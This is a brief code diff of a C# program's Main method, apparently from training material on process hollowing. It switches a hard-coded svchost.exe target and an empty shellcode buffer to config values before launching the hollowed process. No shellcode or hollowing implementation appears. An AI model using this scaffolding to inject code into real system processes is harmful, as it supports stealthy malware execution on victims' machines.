@@ -14,9 +14,8 @@ namespace _008._4._2_Process_Hollowing
         
         static void Main(string[] args)
         {
-            byte[] buf = { };
-
-            CreateHollowProcess chp = new CreateHollowProcess(@"C:\Windows\System32\svchost.exe", buf);
+            
+            CreateHollowProcess chp = new CreateHollowProcess(CONFIG.HOLLOW_BINARY_TARGET, CONFIG.SHELLCODE);
             chp.StartProcess();
 
         }
